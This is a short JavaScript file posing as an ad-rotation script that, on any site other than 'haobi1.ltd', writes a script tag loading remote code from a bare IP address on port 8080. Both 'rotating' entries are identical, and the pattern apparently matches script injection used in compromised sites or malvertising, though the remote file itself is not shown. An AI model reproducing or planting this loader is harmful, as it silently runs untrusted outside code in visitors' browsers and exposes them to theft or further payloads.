if (window.location.href.indexOf("haobi1.ltd") > -1) {
 } else {

var randoms = {
	ads_codes: ['<script type="text/javascript" src="https://94.131.14.250:8080/ad/c1.js"><'+'/script>','<script type="text/javascript" src="https://94.131.14.250:8080/ad/c1.js"><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();
} 